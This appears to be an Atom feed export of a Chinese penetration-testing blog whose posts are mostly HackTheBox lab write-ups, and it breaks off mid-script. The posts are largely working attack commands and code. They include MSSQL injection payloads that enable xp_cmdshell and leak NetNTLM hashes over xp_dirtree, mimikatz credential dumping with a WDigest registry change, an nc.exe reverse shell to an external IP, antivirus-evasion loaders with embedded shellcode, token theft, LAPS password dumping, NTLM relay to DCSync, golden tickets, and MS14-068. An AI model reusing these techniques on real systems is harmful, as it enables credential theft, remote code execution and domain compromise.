    <content type="html"><![CDATA[<p><a href="https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/" target="_blank" rel="noopener">可窃取NTLM的漏洞及利用方式</a></p><h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>MSSQL数据库通常也用来存储客户端的个人身份信息（PII），并且对更高级别的员工或执行人员产生最大的影响。<br>利用低权限用户帐户，然后针对MSSQL的集成域身份验证重新使用该信息。</p><p>如果数据库接受域身份验证，则通过插入目标UNC路径来滥用本机db过程’xp_dirtree’访问该路径随后在responder侦听的445端口上回调给攻击者。如果成功，MSSQL服务帐户将进行身份验证并提供NetNTLM哈希</p><h2 id="环境说明："><a href="#环境说明：" class="headerlink" title="环境说明："></a><strong>环境说明：</strong></h2><p><a href="https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1存在MSSQL" target="_blank" rel="noopener">https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1存在MSSQL</a> SQLi，发现高权限账户但无法读取密码</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><img src="1.png" alt=""></p><p>默认情况ASP/MSSQL支持堆叠注入：</p><p>常用的存储过程xp_cmdshell，它接收一个Windows命令，运行它并将结果以文本行的格式返回;验证是否可执行命令</p><pre><code>https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1;EXEC xp_cmdshell &apos;ping -c 4 10.10.14.14&apos;-- -</code></pre><p>本地监听icmp没有信息返回，即说明没有权限执行或没有开启xp_cmdshell,（xp_cmdhsell默认是禁用的，尝试开启）；尝试开启：</p><pre><code>http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1; EXEC sp_configure &apos;show advanced options&apos;, 1; EXEC sp_configure &apos;xp_cmdshell&apos;, 1; reconfigure with override; exec master..xp_cmdshell &apos;ping -n 10 10.10.14.14&apos; -- -</code></pre><p>master.dbo.xp_shell  替代 xp_shell尝试绕过， Failed</p><p>猜测是没有权限的问题，<a href="https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/" target="_blank" rel="noopener">想到xp_dirtree外带数据</a>：</p><p>payload：</p><pre><code>http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1;declare%20@q%20varchar(99);set%20@q=%27\\10.10.14.14\test%27;%20exec%20master.dbo.xp_dirtree%20@q%20--%20-</code></pre><p><img src="2.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;可窃取NTLM的漏洞及利用
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>mimikatz抓取密码小记</title>
    <link href="https://github.com/2020/04/26/mimikatz%E6%8A%93%E5%8F%96%E5%AF%86%E7%A0%81%E5%B0%8F%E8%AE%B0/"/>
    <id>https://github.com/2020/04/26/mimikatz%E6%8A%93%E5%8F%96%E5%AF%86%E7%A0%81%E5%B0%8F%E8%AE%B0/</id>
    <published>2020-04-26T05:22:42.000Z</published>
    <updated>2020-04-26T05:23:08.530Z</updated>
    
    <content type="html"><![CDATA[<p><strong>1、直接抓取本机：</strong></p><p>[1]#privilege::debug          //提升权限<br>[2]#sekurlsa::logonpasswords  //抓取密码</p><p><strong>离线破解lsass.dmp</strong></p><p>[1]dump lsass.dmp 回本地   //procudmp、dumpert、quarkspwdump等方法均可以dump下来</p><p>[2]#privilege::debug          //提升权限</p><p>[3]#sekurlsa::minidump C:\Users\Administrator\Downloads\mimikatz_trunk\x64\dumpert.dmp</p><p>[4]#sekurlsa::logonpasswords  //抓取密码</p><p>踩坑点：</p><p>[1]报错1：getting error ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000002)<br>相对路径报错    </p><p>解决方法：lsass.dmp要给完整路径，</p><p>[2]报错2：ERROR kuhl_m_sekurlsa_acquireLSA ; Key import<br>mimikatz版本过低</p><p>解决方法：使用2.0版本</p><p>[3]报错3：ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list</p><p>windows 2012之后明文抓取均会出现这个报错</p><p>需要修改注册表开启 WDigest，等待管理员登陆后再次读取，没有做额外防护就可以直接拿到明文了</p><p><strong>（mimikatz原理是读取内存中的密码，所以需要再次登录才能读取到）</strong></p><pre><code>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;1、直接抓取本机：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;[1]#privilege::debug          //提升权限&lt;br&gt;[2]#sekurlsa::logonpasswords  //抓取密码&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;离线破解lsass.d
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>内网使用smb无文件执行</title>
    <link href="https://github.com/2020/04/26/%E5%86%85%E7%BD%91%E4%BD%BF%E7%94%A8smb%E6%97%A0%E6%96%87%E4%BB%B6%E6%89%A7%E8%A1%8C/"/>
    <id>https://github.com/2020/04/26/%E5%86%85%E7%BD%91%E4%BD%BF%E7%94%A8smb%E6%97%A0%E6%96%87%E4%BB%B6%E6%89%A7%E8%A1%8C/</id>
    <published>2020-04-26T05:04:38.000Z</published>
    <updated>2020-04-26T05:07:25.097Z</updated>
    
    <content type="html"><![CDATA[<p>创建smb共享</p><pre><code>mkdir smb &amp;&amp; cd smbcp  ~/winPEAS.exe  ~/smb   ####将需要的软件放到目录下sudo impacket-smbserver share $(pwd) -smb2support -user Twe1ve -password  123456</code></pre><p>测试：</p><pre><code>$pass = convertto-securestring &apos;123456&apos; -AsPlainText -Force$cred= New-Object System.Management.Automation.PSCredential(&apos;Twe1ve&apos;,$pass)New-PSDrive -name tw -PSProvider FileSystem -Credential $cred -Root \\10.10.14.61\share</code></pre><p><img src="1.png" alt=""></p><p>执行：</p><pre><code>Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; cd share:    ##进入共享磁盘Evil-WinRM* PS share:\&gt; .\winPEAS.exe    ###执行</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;创建smb共享&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;mkdir smb &amp;amp;&amp;amp; cd smb
cp  ~/winPEAS.exe  ~/smb   ####将需要的软件放到目录下
sudo impacket-smbserver share $(pwd) -smb2s
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>shell中实现runas命令</title>
    <link href="https://github.com/2020/04/26/shell%E4%B8%AD%E5%AE%9E%E7%8E%B0runas%E5%91%BD%E4%BB%A4/"/>
    <id>https://github.com/2020/04/26/shell%E4%B8%AD%E5%AE%9E%E7%8E%B0runas%E5%91%BD%E4%BB%A4/</id>
    <published>2020-04-26T04:51:45.000Z</published>
    <updated>2020-04-26T04:52:03.244Z</updated>
    
    <content type="html"><![CDATA[<p>有时候收集到了账户凭据，但是psexec等方式不能远程执行命令的情况,大家第一个想到的就是runas命令了吧，但是我们都知道在shell中不能运行runas命令，下面给出在powershell中实现runas命令的效果</p><pre><code>$pass = convertTo-SecureString &apos;36mEAhz/B8xQ~2VM&apos; -AsPlainText -Force                     $cred= New-Object System.Management.Automation.PSCredential(&quot;Sniper\Chris&quot;,$pass)Invoke-Command -Computer Sniper -ScriptBlock { whoami } -Credential $cred  ###验证是否是正确的凭证Invoke-Command -Computer Sniper -ScriptBlock { dir } -Credential $credInvoke-Command -Computer Sniper -ScriptBlock { C:\ProgramData\nc.exe 10.10.15.64  6636 -e cmd.exe } -Credential $cred  ##反弹shell</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;有时候收集到了账户凭据，但是psexec等方式不能远程执行命令的情况,大家第一个想到的就是runas命令了吧，但是我们都知道在shell中不能运行runas命令，下面给出在powershell中实现runas命令的效果&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$pass = conv
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>C#底层调用powershell过杀软</title>
    <link href="https://github.com/2020/04/26/CSharp%E5%BA%95%E5%B1%82%E8%B0%83%E7%94%A8powershell%E8%BF%87%E6%9D%80%E8%BD%AF/"/>
    <id>https://github.com/2020/04/26/CSharp%E5%BA%95%E5%B1%82%E8%B0%83%E7%94%A8powershell%E8%BF%87%E6%9D%80%E8%BD%AF/</id>
    <published>2020-04-26T04:30:27.000Z</published>
    <updated>2020-04-26T04:32:21.948Z</updated>
    
    <content type="html"><![CDATA[<p><strong>这里C#调用只是一个思路，还有很多方式调用powershell以逃避检测，达到免杀效果。免杀注重的还是思路，今天免杀的东西说不定明天就被杀了。</strong></p><p>国内某数字杀软，会拦截powershell的运行，以前常用的复制powershell到当前目录执行也被拦截，或者修改empire中的特定函数同样被检测到,很多方式不再适用</p><p>从C#中调用</p><p>添加运行powershell需要的程序包：</p><p>C#调用powershell安装system.management.automation.dll：</p><p>管理NuGet程序包-&gt;浏览-&gt;搜索system.management.automation-&gt;选择system.management.automation.dll-&gt;重新生成项目即可</p><pre><code>using System; using System.Configuration.Install; using System.Runtime.InteropServices; using System.Management.Automation.Runspaces; public class Program { public static void Main() { } } [System.ComponentModel.RunInstaller(true)] public class Sample : System.Configuration.Install.Installer { public override void Uninstall(System.Collections.IDictionary savedState) { Mycode.Exec(); } } public class Mycode { public static void Exec() { string command = System.IO.File.ReadAllText(@&quot;C:\Users\fmc\Desktop\PowerUp.ps1&quot;); RunspaceConfiguration rspacecfg = RunspaceConfiguration.Create(); Runspace rspace = RunspaceFactory.CreateRunspace(rspacecfg); rspace.Open(); Pipeline pipeline = rspace.CreatePipeline(); pipeline.Commands.AddScript(command); pipeline.Invoke(); } }</code></pre><p>PS1文件需要适当混淆以过静态查杀</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;这里C#调用只是一个思路，还有很多方式调用powershell以逃避检测，达到免杀效果。免杀注重的还是思路，今天免杀的东西说不定明天就被杀了。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;国内某数字杀软，会拦截powershell的运行，以前常用的复制powershel
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>C内存加载过杀软</title>
    <link href="https://github.com/2020/04/26/C%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD%E8%BF%87%E6%9D%80%E8%BD%AF/"/>
    <id>https://github.com/2020/04/26/C%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD%E8%BF%87%E6%9D%80%E8%BD%AF/</id>
    <published>2020-04-26T03:45:03.000Z</published>
    <updated>2020-04-26T03:49:11.228Z</updated>
    
    <content type="html"><![CDATA[<p>C的加载器有好几种，直接把shellcode放进源码中能够过静态层面的查杀，但是运行时会被查杀；</p><p>如最常用的加载器：</p><pre><code>#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#pragma comment(linker,&quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;)unsigned char shellcode[] =&quot;\x31\xdb\x64\x8b\x7b\x30\x8b\x7f&quot;&quot;\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b&quot;&quot;\x77\x20\x8b\x3f\x80\x7e\x0c\x33&quot;&quot;\x75\xf2\x89\xc7\x03\x78\x3c\x8b&quot;&quot;\x57\x78\x01\xc2\x8b\x7a\x20\x01&quot;&quot;\xc7\x89\xdd\x8b\x34\xaf\x01\xc6&quot;&quot;\x45\x81\x3e\x43\x72\x65\x61\x75&quot;&quot;\xf2\x81\x7e\x08\x6f\x63\x65\x73&quot;&quot;\x75\xe9\x8b\x7a\x24\x01\xc7\x66&quot;&quot;\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7&quot;&quot;\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9&quot;&quot;\xb1\xff\x53\xe2\xfd\x68\x63\x61&quot;&quot;\x6c\x63\x89\xe2\x52\x52\x53\x53&quot;&quot;\x53\x53\x53\x53\x52\x53\xff\xd7&quot;;void main(){    ((void(*)(void))&amp;shellcode)();}</code></pre><p>解决方法1：加密shellcode再解密运行（最后用一些比较偏的加密算法）</p><p>解决方法2：pyaload分离<br>[1]借助main的入口参数，用户直接输shellcode</p><p>[2]从txt文件中加载shellcode</p><p>这个当初比较头疼，因为C语言这方面确实不大行，从txt读取shellcode的时候出现问题;记录如下：</p><ul><li>获取txt中shellcode长度，申请内存空间</li></ul><ul><li>.使用fread读取txt为字符串，加载难以识别出shellcode    </li></ul><ul><li>.fscanf判定shellcode分割符需要进行转义(这点是乔哥解决的，我乔哥还是强啊)</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;C的加载器有好几种，直接把shellcode放进源码中能够过静态层面的查杀，但是运行时会被查杀；&lt;/p&gt;
&lt;p&gt;如最常用的加载器：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#include &amp;lt;windows.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#pra
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>incognito Stealing Windows Access Tokens</title>
    <link href="https://github.com/2020/04/26/incognito-Stealing-Windows-Access-Tokens/"/>
    <id>https://github.com/2020/04/26/incognito-Stealing-Windows-Access-Tokens/</id>
    <published>2020-04-26T02:18:58.000Z</published>
    <updated>2020-04-26T02:48:39.678Z</updated>
    
    <content type="html"><![CDATA[<p>使用incognito可以窃取令牌以任意用户身份执行任意命令或payload</p><p>得到当前管理员权限，域管理员帐户已登录到该计算机，则可能可以简单地从中读取域管理员的访问令牌<br>列出域管理组成员：</p><pre><code>net groups &quot;Domain Admins&quot; /domain</code></pre><p><strong>0x01、ACCESS TOKEN(访问令牌)：</strong></p><p>当用户登录时，Windows会为此用户创建访问令牌，用于存储用户的身份和特权</p><p>Token在用户创建进程或者线程时会被使用，那么这些进程或者线程能够访问哪些资源取决于当前令牌</p><p><strong>0x02、令牌类型</strong></p><p>Delegation token(授权令牌):用于交互会话登录(例如本地用户直接登录、远程桌面登录)</p><p>Impersonation token(模拟令牌):用于非交互登录(利用net use访问共享文件夹)</p><p>这两种令牌,都会在系统重启以后被清除, 否则将会一直驻留在内存中,而授权令牌则会在用户注销以后自动被转为模拟令牌,但仍然可利用。</p><p><strong>0x03、本地和远程的基本用法</strong></p><p><strong>本地：</strong> </p><p>查看 token：</p><p><code>incognito.exe list_tokens–u</code> </p><p>获取到已注销用户 int18\administrator的token,盗取token 执行命令： </p><pre><code>incognito.exe execute -c &quot;int18\administrator&quot; calc.exe </code></pre><p><strong>远程：</strong></p><pre><code>incognito -h 10.101.112.213 -u employee2012\administrator -p abc@123  list_tokens -u</code></pre><p><img src="1.png" alt=""></p><pre><code>incognito -h 10.101.112.213 -u employee2012\administrator -p abc@123  execute -c &quot;NT AUTHORITY\SYSTEM&quot; cmd.exe </code></pre><p><img src="2.png" alt=""></p><p><strong>0x04、提权、降权、伪造（以本地示例)</strong></p><pre><code>incognito execute -c &quot;NT AUTHORITYSYSTEM&quot; cmd.exe #提权至system incognito execute -c &quot;int\test&quot; cmd.exe #降权至当前 test 用户 incognito execute -c &quot;int\test1&quot; cmd.exe #伪造test1 用户 </code></pre><p>0x03、获取TrustedInstaller 权限（修改系统文件）<br>管理员、System 均无法修改系统文件、需 TrustedInstaller 权限<br><a href="https://tyranidslair.blogspot.nl/2017/08/the-art-of-becoming-trustedinstaller.html" target="_blank" rel="noopener">借用 TrustedInstaller.exe 的 token 创建子进程，这样子进程就有了 TrustedInstaller 权限</a></p><p>在CS下获取TrustedInstaller </p><blockquote><p>shell sc strat TrustedInstaller </p></blockquote><blockquote><p>steal token  1700 ##ps查看TrustedInstaller进程号</p></blockquote><blockquote><p>shell whoami /groups</p></blockquote><p>链接：</p><p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Token%E7%AA%83%E5%8F%96%E4%B8%8E%E5%88%A9%E7%94%A8/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Token%E7%AA%83%E5%8F%96%E4%B8%8E%E5%88%A9%E7%94%A8/</a></p><p><a href="https://blog.csdn.net/qq_36374896/article/details/84261516" target="_blank" rel="noopener">https://blog.csdn.net/qq_36374896/article/details/84261516</a>  </p><p><a href="https://tyranidslair.blogspot.nl/2017/08/the-art-of-becoming-trustedinstaller.html" target="_blank" rel="noopener">https://tyranidslair.blogspot.nl/2017/08/the-art-of-becoming-trustedinstaller.html</a> </p><p><a href="https://www.jianshu.com/p/907c6aab6fd0" target="_blank" rel="noopener">https://www.jianshu.com/p/907c6aab6fd0</a></p><p><a href="http://paper.vulsee.com/Micro8/%E7%AC%AC%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E8%AF%BE%EF%BC%9A%E7%AA%83%E5%8F%96%2C%E4%BC%AA%E9%80%A0%E6%A8%A1%E6%8B%9F%E5%90%84%E7%A7%8Dwindows%E8%AE%BF%E9%97%AE%E4%BB%A4%E7%89%8C%5Btoken%E5%88%A9%E7%94%A8%5D.pdf" target="_blank" rel="noopener">http://paper.vulsee.com/Micro8/%E7%AC%AC%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E8%AF%BE%EF%BC%9A%E7%AA%83%E5%8F%96%2C%E4%BC%AA%E9%80%A0%E6%A8%A1%E6%8B%9F%E5%90%84%E7%A7%8Dwindows%E8%AE%BF%E9%97%AE%E4%BB%A4%E7%89%8C%5Btoken%E5%88%A9%E7%94%A8%5D.pdf</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;使用incognito可以窃取令牌以任意用户身份执行任意命令或payload&lt;/p&gt;
&lt;p&gt;得到当前管理员权限，域管理员帐户已登录到该计算机，则可能可以简单地从中读取域管理员的访问令牌&lt;br&gt;列出域管理组成员：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;net groups &amp;quot
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>域渗透之AD Recyle Bin组利用+Ldaps信息枚举</title>
    <link href="https://github.com/2020/04/26/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8BAD-Recyle-Bin%E7%BB%84%E5%88%A9%E7%94%A8-Ldaps%E4%BF%A1%E6%81%AF%E6%9E%9A%E4%B8%BE/"/>
    <id>https://github.com/2020/04/26/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8BAD-Recyle-Bin%E7%BB%84%E5%88%A9%E7%94%A8-Ldaps%E4%BF%A1%E6%81%AF%E6%9E%9A%E4%B8%BE/</id>
    <published>2020-04-26T01:14:42.000Z</published>
    <updated>2020-04-26T01:37:49.040Z</updated>
    
    <content type="html"><![CDATA[<h2 id="AD-Recyle-Bin组利用："><a href="#AD-Recyle-Bin组利用：" class="headerlink" title="AD Recyle Bin组利用："></a>AD Recyle Bin组利用：</h2><p>使用回收站还原用户，或获取用户旧密码进行碰撞</p><p>前提,需要域内启用回收站功能，且用户在AD Recyle Bin 组中</p><p><strong>未启用启用回收站和启用回收站删除对象对比</strong></p><p>图1：启用回收站之前已删除的Active Directory对象的生命周期</p><p><img src="1.jpg" alt=""></p><p>图2：启用回收站后已删除的Active Directory对象的生命周期</p><p><img src="2.jpg" alt=""></p><p>启用AD回收站：</p><pre><code>Enable-ADOptionalFeature –Identity ‘CN=Recycle Bin Feature,CN=Optional Features,CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=www,DC=domain,DC=com’ –Scope ForestOrConfigurationSet –Target ‘www.domain.com’</code></pre><p>查看删除用户</p><pre><code>Get-ADObject -filter &apos;isDeleted -eq $true -and name -ne &quot;Deleted Objects&quot;&apos; -includeDeletedObjects</code></pre><p>结果示例：</p><pre><code>Deleted           : TrueDistinguishedName : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=localName              : TempAdmin                DEL:f0cc344d-31e0-4866-bceb-a842791ca059ObjectClass       : userObjectGUID        : f0cc344d-31e0-4866-bceb-a842791ca059</code></pre><p>尝试还原已删除账户</p><pre><code>Restore-ADObject -Identity &apos;f0cc344d-31e0-4866-bceb-a842791ca059&apos;###使用ObjectGUID进行还原</code></pre><p>或</p><pre><code>Get-ADObject -Filter {displayName -eq  &quot;TempAdmin&quot;} IncludeDeletedObjects | Restore-ADObject</code></pre><p>查询ms-mcs-admpwd</p><pre><code>Get-ADObject -ldapFilter:&quot;(msDS-LastKnownRDN=*)&quot; –IncludeDeletedObjects -Property ms-mcs-admpwd  </code></pre><p>查看有关于特定账户的全部属性信息：</p><pre><code>Get-ADObject -Filter {displayName -eq &quot;TempAdmin&quot;} -IncludeDeletedObjects -Properties *  cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz</code></pre><p>如这里存在LegacyPassword（直接缓存的旧密码）名称被自定义，通过查看所有属性列出来</p><h2 id="Ldap枚举：获取基本的账户信息、密码"><a href="#Ldap枚举：获取基本的账户信息、密码" class="headerlink" title="Ldap枚举：获取基本的账户信息、密码"></a>Ldap枚举：获取基本的账户信息、密码</h2><p>ldapsearch 使用：<br>列出基本的上下文信息</p><pre><code>kali@kali:$ ldapsearch -h 10.10.10.182 -D  cascade.local -x -s base namingcontexts</code></pre><p>提取整个域目录的数据，然后grep筛选输出：</p><pre><code>kali@kali:$ ldapsearch -h 10.10.10.182 -D cascade.local -x -s sub -b &quot;DC=cascade,DC=local&quot; |tee ldap.outroot@kali:$ cat ldap.out |grep -i memberof</code></pre><p>筛选输出：</p><pre><code>kali@kali:$ ldapsearch -h 10.10.10.182 -D cascade.local -x -b &quot;DC=cascade,DC=local&quot; &apos;(objectClass=User)&apos; sAMAccountName sAMAccountType</code></pre><p>列出管理用户组</p><pre><code>kali@kali:$ ldapsearch -h 10.10.10.182 -D cascade.local -x -b &quot;DC=cascae,DC=local&quot; &apos;(memberOf=CN=Remote Management Users,OU=Groups,OU=UK,DC=cascade,DC=local)&apos; |grep -i memberof</code></pre><p>Dump LAPS passwords:</p><pre><code>kali@kali:$ ldapsearch -h  -D cascade.local -x -b &quot;dc=cascade,dc=local&quot; &apos;(ms-MCS-AdmPwd=*)&apos; ms-MCS-AdmPwd</code></pre><p>同样windapsearch也是一个不错的工具</p><pre><code>kali@kali:$./windapsearch_py2.py  --dc-ip 10.10.10.182 -d cascade.local --full --users...user:r.thompsoncascadeLegacyPwd: clk0bjVldmE=...</code></pre><p><a href="https://github.com/snovvcrash/cheatsheets/tree/master">https://github.com/snovvcrash/cheatsheets/tree/master</a> </p><p><a href="https://www.lepide.com/how-to/restore-deleted-objects-in-active-directory.html" target="_blank" rel="noopener">https://www.lepide.com/how-to/restore-deleted-objects-in-active-directory.html</a> </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;AD-Recyle-Bin组利用：&quot;&gt;&lt;a href=&quot;#AD-Recyle-Bin组利用：&quot; class=&quot;headerlink&quot; title=&quot;AD Recyle Bin组利用：&quot;&gt;&lt;/a&gt;AD Recyle Bin组利用：&lt;/h2&gt;&lt;p&gt;使用回收站还原用户，
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>域控提权之Exchange提权</title>
    <link href="https://github.com/2020/04/26/%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83%E4%B9%8BExchange%E6%8F%90%E6%9D%83/"/>
    <id>https://github.com/2020/04/26/%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83%E4%B9%8BExchange%E6%8F%90%E6%9D%83/</id>
    <published>2020-04-25T16:09:28.000Z</published>
    <updated>2020-04-25T16:32:53.954Z</updated>
    
    <content type="html"><![CDATA[<h2 id="原理-："><a href="#原理-：" class="headerlink" title="原理 ："></a>原理 ：</h2><p>Exchange Windows Permissions组成员在域内具有WriteDacl权限，将该组任意集成组WriteDacl权限的成员身份中继到LDAP后，可以修改域对象的ACL授予用户更高级别的访问权限，执行DCSync</p><p>也就是利用Exchange默认高权限账户进行LDAP中继授予用户DCSync权限</p><h2 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h2><p>net group 查看用户组</p><p><img src="1.png" alt=""></p><p>或者当前用户不在Exchange Permissions组中，但在Account Operator中（该组的成员能操作用户管理员所属域的账号和组，并可设置其权限。但是该组成员无法修改Administrators及Operators组及权限），可以添加一个用户并加入到Exchange Permissions组</p><p>添加用户tw：</p><pre><code>$pass = ConvertTo-SecureString &quot;password&quot; -AsPlainText -ForceNew-ADUser tw -AccountPassword $pass -Enabled $True</code></pre><p>将用户添加到Exchange Permissions组</p><pre><code>net group &quot;Exchange Windows Permissions&quot; tw /add 或Import-Module ActiveDirectoryAdd-ADGroupMember -Identity &quot;Exchange Windows Permissions&quot; -Members  tw</code></pre><p>检查是否已成功添加</p><pre><code>net group &quot;Exchange Windows Permissions&quot; /domain </code></pre><p>使用ntlmrelayx.py进行ntlm中继：</p><pre><code>sudo python ntlmrelayx.py -t  ldap://10.10.10.161 --escalate-user tw</code></pre><p>运行该中继命令之后，可通过浏览器访问本地127.0.0.1进行连接（输入tw账户密码），也可使用prieexchange.py进行连接</p><pre><code>python privexchange.py  -ah 10.10.16.21  10.10.10.161   -u tw-p password -d htb.local</code></pre><p>（10.10.16.21为我kali ip）</p><p><img src="2.png" alt=""></p><p>连接成功之后，使用secretdump.py导出域控hash #######时间蛮久的，需要出现上图提示</p><pre><code>impacket-secretsdump htb.local/tw:password@10.10.10.161 -just-dc</code></pre><p><img src="3.png" alt=""></p><p><strong>进一步学习：在Linux上使用KRBTGT hash实现金票攻击</strong></p><p>在上面的实验中，同样还获得了KRBTGT hash，下面学习学习如何在Linux上使用它</p><p>首先获取domain sid ：</p><pre><code>Get-ADDomain htb.localS-1-5-21-3072663084-364016917-1341370565</code></pre><p>使用NTLM生成TGT###TGT也可以使用AES-KEY生成</p><pre><code>python ticketer.py -nthash 819af826bb148e603acb0f33d17632f8 -domain-sid  S-1-5-21-3072663084-364016917-1341370565 -domain HTB.LOCAL UserDoesnotExit</code></pre><p>运行之后生成一个UserDoesnotExit.ccache缓存文件<br>使用ccache设置ticket</p><p><code>export KRB5CCNAME=UserDoesnotExit.ccache</code></p><p>使用TGT使用下列任意方式远程执行命令</p><pre><code>python psexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-passpython smbexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-passpython wmiexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass</code></pre><p>执行之前需要同步域控时间，否则会出现下列错误<br>    sudo rdate 10.10.10.161</p><p><img src="4.png" alt=""></p><pre><code>python psexec.py HTB.LOCAL/UserDoesnotExit@HTB.LOCAL -k -no-pass</code></pre><p>不能使用IP进行连接</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;原理-：&quot;&gt;&lt;a href=&quot;#原理-：&quot; class=&quot;headerlink&quot; title=&quot;原理 ：&quot;&gt;&lt;/a&gt;原理 ：&lt;/h2&gt;&lt;p&gt;Exchange Windows Permissions组成员在域内具有WriteDacl权限，将该组任意集成组WriteD
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>域控提权之ms14-068</title>
    <link href="https://github.com/2020/04/25/%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83%E4%B9%8Bms14-068/"/>
    <id>https://github.com/2020/04/25/%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83%E4%B9%8Bms14-068/</id>
    <published>2020-04-25T14:57:08.000Z</published>
    <updated>2020-04-25T15:10:07.667Z</updated>
    
    <content type="html"><![CDATA[<p>危害：任意域控用户都可以提权到域控<br>一般为本地账户才能成功，但是使用klist purge清除缓存证书可绕过限制</p><h2 id="一、漏洞成因"><a href="#一、漏洞成因" class="headerlink" title="一、漏洞成因"></a>一、漏洞成因</h2><p>在 KDC 对 PAC 进行验证时，根据协议规定必须是带有 server Hash、KDC Hash 的签名算法才可以（原本的设计是 HMAC 系列的 checksum 算法），但微软在实现上，<strong>却允许任意签名算法</strong>。只要客户端指定任意签名算法，KDC 就会使用指定的算法进行签名验证，致使导致恶意用户在发送给KDC的TG_REQ中可以创建包含管理员帐户成员身份的伪造PAC被KDC接收，并将其放入TG_REP中发布的新TGT票证中。该票证可用于向KDC要求服务票证的服务升级特权：在这种情况下，是smb服务票证。 </p><p><strong>什么是PAC（特权帐户证书）：</strong></p><p>PAC包含域控制器（DC）提供的授权数据，Active Directory将授权数据存储在PAC（特权帐户证书）的票证字段中。<br>    PAC由DC在服务单的现场授权数据中提供。它用KDC密钥（只有AD知道）签名，并用要验证的服务和AD之间共享的服务密钥签名。</p><h2 id="二、利用条件"><a href="#二、利用条件" class="headerlink" title="二、利用条件"></a>二、利用条件</h2><pre><code>1.域控机器没有打漏洞补丁      补丁号：KB30117802.拥有一台域内机子及其sid</code></pre><h2 id="三、漏洞利用"><a href="#三、漏洞利用" class="headerlink" title="三、漏洞利用"></a>三、漏洞利用</h2><p>漏洞检测：<br>FindSMB2UpTime.py(但是这个并不一定准确，因为域控是一般不会重启，但是也有存在意外重启的情况，那么即使有ms14-068也不会显示)</p><pre><code>./FindSMB2UPTime.py 192.168.31.220DC is up since: 2013-12-28 22:24:25This DC is vulnerable to MS14-068</code></pre><p>获取域控制器补丁状态:Get-DCPatchStatus.ps1</p><pre><code># This is an example script only.import-module activedirectory[string]$KBNumber = &quot;KB3011780&quot;$DomainControllers = Get-ADDomainController -filter *[int]$DomainControllersCount = 